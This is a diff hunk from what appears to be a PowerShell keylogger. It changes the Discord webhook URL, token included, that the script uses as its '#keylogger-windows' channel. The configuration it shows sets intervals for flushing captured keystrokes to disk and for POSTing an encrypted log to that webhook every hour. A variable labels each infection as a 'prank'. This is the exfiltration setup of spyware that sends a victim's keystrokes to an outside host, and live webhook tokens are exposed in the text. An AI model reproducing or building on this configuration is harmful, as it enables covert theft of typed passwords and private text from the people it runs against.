@@ -6,7 +6,7 @@
 ####################################################################################################
 
 # --- Configuration -----------------------------------------------------------
-$webhookUrl  = 'https://discord.com/api/webhooks/1504979894784888993/HhDjgT0J4kVExANWtMVdZHUT1J_J_6P99JwtIruQqtPMUaSD4q3SFQKEiLXfsxR2xS16'  # Discord webhook (#keylogger-windows) — from DISCORD_WEBHOOK_KEYLOGGER_WINDOWS in .env
+$webhookUrl  = 'https://discord.com/api/webhooks/1568088128663588966/DIC4qfZyflPUPNc7Y8Ihdk6cTL4w1A8yr4gtRlZ9ZfxC9n8ZpSflYXUVcsmPzCFp3Qii'  # Discord webhook (#keylogger-windows) — from DISCORD_WEBHOOK_KEYLOGGER_WINDOWS in .env
 $flushSecs   = 30            # How often (seconds) to flush buffered keystrokes to disk
 $uploadMins  = 60            # How often (minutes) to POST encrypted log to webhook
 $prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
